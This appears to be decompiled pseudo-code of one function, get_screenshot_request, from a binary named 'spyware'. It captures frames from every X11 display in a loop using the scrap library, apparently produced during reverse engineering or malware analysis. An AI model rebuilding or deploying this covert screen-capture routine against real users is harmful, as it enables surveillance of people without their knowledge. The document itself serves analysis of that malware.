
  fn spyware::actions::screenshot_actions::get_screenshot_request::h77f87121c90614c4(arg1: *mut i128) -> *mut i128

{
    let mut var_130: i64 = 0;
    let var_128: i64 = 8;
    let var_120: i64 = 0;
    let mut var_178: *mut *mut [i8; 0x82];
    let mut var_d8: *const i8;
    let mut var_b8: i64;
    
    if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4
    {
        var_178 = &data_4b9f08;
        let var_170_1: i64 = 1;
        let var_168_1: i64 = 8;
        let var_160_1: i128 = {0};
        let rax_1: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9f38);
        var_d8 = "spyware::actions::screenshot_act…";
        let var_d0_1: i64 = 0x24;
        let var_c8_1: *const i8 = "spyware::actions::screenshot_act…";
        let var_c0_1: i64 = 0x24;
        var_b8 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_178, 4, &var_d8);
    }
    
    scrap::common::x11::Display::all::h028c2cd890d978af(&var_178);
    let mut var_48: ();
    core::result::Result$LT$T$C$E$GT$::expect::hefa40e5ef76aaa1f(&var_48, &var_178);
    let mut var_68: ();
    _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::hb4b0dd109b77bc21(&var_68, &var_48);
    let mut var_90: i128;
    _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5ea6a75bdaeb1c6c(&var_90, &var_68);
    let var_7c: i8;
    
    if var_7c == 2
    {
        core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$scrap..common..x11..Display$GT$$GT$::h7f2fe04fdf4c91d5(&var_68);
        arg1[1] = var_120;
        *arg1 = var_130;
        *arg1.byte_offset(0x18) = -0x8000000000000000;
        return arg1;
    }
    
    let zmm0: i128 = var_90;
    var_178 = &data_4b9f18;
    let var_170_2: i64 = 1;
    let var_168_2: i64 = 8;
    let mut var_160_2: u128 = {0};
    std::io::stdio::_print::h17d6c2a1d6a6f99e(&var_178);
    let var_80: i64;
    let var_c8_2: i64 = var_80;
    var_d8 = zmm0;
    scrap::common::x11::Capturer::new::he891e0d15b72a285(&var_178, &var_d8);
    core::result::Result$LT$T$C$E$GT$::expect::h742920b880be4ab9(&var_d8, &var_178);
    let zmm1: u128 = _mm_unpacklo_epi32(_mm_unpacklo_epi16(*var_b8[4], 0), 0);
    let mut var_180: u64;
    let mut var_f0: u128;
    
    loop
    {
        let mut var_118: i64;
        scrap::common::x11::Capturer::frame::hab680e12d159cf27(&var_118, &var_d8);
        let rsi_6: i64 = var_118;
        let var_110: u64;
        
        if rsi_6 == 0
        {
            var_180 = var_110;
            
            if std::io::error::Error::kind::h7f0d5435ec1cf07f(var_110) != 0xd
            {
                break;
            }
            
            std::thread::sleep::h1a6eeffe1c923e1f(0, 0xfe502a);
            core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_180);
        }
        else
        {
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4bd00d1297ead281(
                &var_f0, rsi_6, var_110);
            let var_e0: i64;
            let var_168_3: i64 = var_e0;
            var_178 = var_f0;
            var_160_2 = zmm1;
            alloc::vec::Vec$LT$T$C$A$GT$::push::he3b9a1547804d23c(&var_130, &var_178);
        }
    }
    
    var_f0 = &var_180;
    *var_f0[8] =
        _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
    var_178 = &data_4b9f28;
    let var_170_3: i64 = 1;
    *var_160_2[8] = 0;
    let var_168_4: *mut u128 = &var_f0;
    var_160_2 = 1;
    core::panicking::panic_fmt::he33b64161001a34b(&var_178);
    /* no return */
}
